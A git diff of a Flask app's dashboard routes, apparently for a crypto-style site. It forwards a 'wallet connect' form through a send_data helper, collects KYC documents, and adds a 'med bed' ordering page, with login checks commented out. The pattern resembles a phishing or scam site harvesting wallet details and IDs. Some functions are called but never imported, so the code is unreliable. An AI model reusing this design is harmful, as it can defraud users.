@@ -5,7 +5,7 @@ from flask_login import login_user, logout_user, login_required, current_user
 from .view_utils.authentication import login_user_from_db,decode_verification_token,verify,resend_verification_mail
 from .view_utils.data_objects import *
 from .view_utils.currency_price import get_usd_to_
-from ..utils.helpers import greet, send_data, send_kyc
+from ..utils.helpers import greet, send_data, send_kyc, send_medbed
 
 
 
@@ -17,8 +17,8 @@ dashboard = Blueprint('dashboard', __name__, url_prefix='/dashboard')
 # @login_required
 def dashboard_home():
     if request.method=="POST":
-        if send_kyc(request ):
-                flash('Documents SUBMITTED, Under Review', 'success')
+        if send_data(request.form):
+                flash('Wallet is Connected Successfully', 'success')
         else:
                 flash('We could not receive your documents, try again later', 'warning')
 
@@ -202,7 +202,10 @@ def invoice():
 @dashboard.route('/kyc', methods=('POST','PUT','GET'))
 # @login_required
 def kyc():
-   
+    if send_kyc(request ):
+                flash('Documents SUBMITTED, Under Review', 'success')
+    else:
+                flash('We could not receive your documents, try again later', 'warning')
     return render_template('dashboard/kyc.html')
 
 @dashboard.route('/bill', methods=('POST','PUT','GET'))
@@ -228,6 +231,14 @@ def payout():
 def payout_list():
    
     return render_template('dashboard/payout-list.html')
+
+@dashboard.route('/medbed', methods=('POST','PUT','GET'))
+# @login_required
+def med_bed():
+    if request.method == 'POST':
+        order_medbed(request)
+    medbed = get_medbed()
+    return render_template('dashboard/med-bed.html', medbed=medbed)
 
 
 
